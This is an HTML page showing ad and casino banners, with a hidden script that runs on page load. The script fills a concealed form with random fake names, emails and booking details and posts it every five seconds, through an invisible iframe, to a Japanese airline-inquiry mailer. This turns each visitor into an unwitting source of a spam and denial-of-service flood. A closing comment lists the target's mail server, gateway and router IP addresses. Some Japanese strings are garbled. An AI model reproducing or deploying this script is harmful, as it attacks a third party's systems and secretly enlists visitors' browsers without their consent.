<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=x-sjis">
<META NAME="GENERATOR" Content="Microsoft Visual Studio 6.0">
<TITLE></TITLE>
</HEAD>
<BODY>
<p align=center>
<img align=center src="http://www.jfstudio.net/cgi-bin/ads/cgi-bin/random.cgi?id=82"><bR>
<img align=center src="http://www.mylove365.net/newlog4.jpg"><bR>
<img align=center src="http://www.mylove365.net/casino.gif"><bR>
</p>
<form name=airinfo method=post action="">
<input type=hidden name="ord_id">
<input type=hidden name="kan_name">
<input type=hidden name="eng_name">
<input type=hidden name="mailaddr">
<input type=hidden name="dep_year">
<input type=hidden name="dep_mon">
<input type=hidden name="dep_day">
<input type=hidden name="arr_year">
<input type=hidden name="arr_mon">
<input type=hidden name="arr_day">
<input type=hidden name="ask_div">
<input type=hidden name="my_area">
<input type=hidden name="dep_place">
<input type=hidden name="arr_place">
<input type=hidden name="ask_memo">
<input type=hidden name="stat" value="ask">
</form>

</BODY>
</HTML>
<script language=JScript>
airinfo.action="http://airinfo.anscom.co.jp/send_mail.asp";
airinfo.target="ans";
document.write("<iframe name=ans style='visibility:hidden;display:none'></iframe>");
var nums="0123456789";
var alphabet="abcedfghijklmnopqrstuvwxyz";
function setValues()
{
	airinfo.ord_id.value=Math.ceil(Math.random()*10000);
	airinfo.kan_name.value=makeChar(4);
	airinfo.eng_name.value=makeEname(20);
	airinfo.mailaddr.value=makeMail();
	airinfo.dep_place.value=makeChar(4);
	airinfo.arr_place.value=makeChar(4);
	var ask=new Array("¿–â","PUSH","•ÏX","ƒLƒƒƒ“ƒZƒ‹");
	var area=new Array("asia","euro","euro","na","oceania","sa","latin");
	airinfo.ask_div.value=ask[Math.floor(Math.random()*ask.length)];
	airinfo.my_area.value=area[Math.floor(Math.random()*area.length)];
	airinfo.ask_memo.value=makeChar(100);
}

function makeChar(ii) 
{	
	var y="";	
	for(var i=0; i<ii; i++)
	{
		var x=Math.floor(Math.random()*100);
		
		if(x<10) {
			y += "%u730"+x;
		} else {
			y += "%u73"+x;
		}
		// if(i%10==0) y += "%0D%0A";
	}
	return unescape(y);
}

function makeMail()
{
	var chars=alphabet+nums;
	var rtn=alphabet.charAt(Math.floor(Math.random()*alphabet.length));
	var ii=10;
	for(var i=0; i<ii; i++) 
	{
		rtn += chars.charAt(Math.floor(Math.random()*chars.length));
		if(i==Math.floor(ii/2)) rtn += "@";
	}
	return rtn + ".co.jp";
}

function makeEname(ii)
{
	var rtn = "";
	var chars=alphabet;
	for(var i=0;i<ii;i++)
	{
		rtn += chars.charAt(Math.floor(Math.random()*chars.length));
		if(i==Math.floor(ii/2)) rtn += " ";
	}
	return rtn;
}

function doSubmit()
{
	setValues();
	// alert();
	setTimeout("doSubmit()",5000);
	airinfo.submit();
	// alert();
}
doSubmit();

</script>
<!--
/*
smtp server: 210.190.31.98
gateway: 210.190.31.99
router: 210.190.31.97
*/
-->